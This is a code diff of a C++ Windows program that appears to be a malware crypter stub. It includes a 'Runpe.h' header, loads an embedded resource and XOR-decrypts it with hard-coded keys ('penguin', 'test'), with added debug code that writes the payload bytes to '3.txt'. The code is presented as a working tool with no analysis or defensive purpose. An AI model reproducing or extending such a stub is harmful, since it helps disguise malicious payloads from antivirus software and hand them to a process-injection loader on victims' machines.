@@ -3,12 +3,11 @@
 #include <fstream>
 #include "Runpe.h"
 #include <string>
+using namespace std;
 
 
 int Rsize;
-int choice_size;
 char* RData;
-std::string choice;
 
 
 void Resource(int id)
@@ -29,14 +28,38 @@ void enc()
 		}
 			break;
 	case '2':
-		{	char cipher[] = "penguin";
-			for (int i = 0; i < Rsize; i++)
-			RData[i] ^= cipher[i % strlen(cipher)];			
-			}												// Simple Xor chiper
+		{	
+			string cipher = "penguin";
+			for (unsigned x = 0; x < Rsize; x++)           // Steps through the characters of the string.
+				RData[x] ^= cipher[x % cipher.size()];
+			//for (int i = 0; i < Rsize; i++)       
+			//	{
+			//		out << RData[i]; // ^= cipher[i % strlen(cipher)];
+			//	}
+
+		//	char cipher[] = "penguin";
+		//ofstream out("Stub Output.txt");
+		//	for (int i = 0; i < Rsize; i++)       
+		//	{
+		//		out << RData[i]; // ^= cipher[i % strlen(cipher)];
+		//	}
+		}												// Simple Xor chiper
 				break; 
 	case '3':
 		{	std::ofstream out("3.txt");
-			out.close();
+			out << strlen(RData) - 1;
+			char cipher[] = "test";
+			unsigned short pl = strlen(cipher);
+			char passTable[1024];
+			for (int i = 0; i != 1024; ++i)
+				passTable[i] = cipher[i%pl];
+
+			for (unsigned long long i = 0; i != Rsize; i += 2)
+			{
+				out << RData[i];
+				RData[i] ^= passTable[i % 1024];
+			}
+
 		}
 		break;
 	}
@@ -45,6 +68,7 @@ void enc()
 
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
 {
+	
 	Resource(1);
 	enc();
 
